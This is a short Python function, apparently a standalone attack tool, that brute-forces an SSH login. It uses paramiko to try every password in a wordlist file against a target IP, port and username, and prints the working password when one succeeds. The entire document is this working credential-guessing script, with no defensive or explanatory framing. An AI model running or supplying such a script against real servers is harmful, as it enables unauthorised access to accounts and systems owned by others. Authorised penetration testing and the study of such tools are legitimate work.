
def ssh_brute(target_ip,username,pass_file,port):
    import paramiko
    import sys 
    import os

    def connect(password,code=0):
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

        try:
            ssh.connect(target_ip,port,username=username,password=password)
        except paramiko.AuthenticationException:
            code = 1
        ssh.close()
        return code 
    
    with open(pass_file,'r') as f:
        for passwd in f.readlines():
            passwd = passwd.strip()

            try:
                res = connect(passwd)

                if res == 0:
                    print("--[+]--",passwd)
                    exit(0)
                else:
                    print("--[x]--",passwd)
            except Exception as e:
                print(e)
    
    

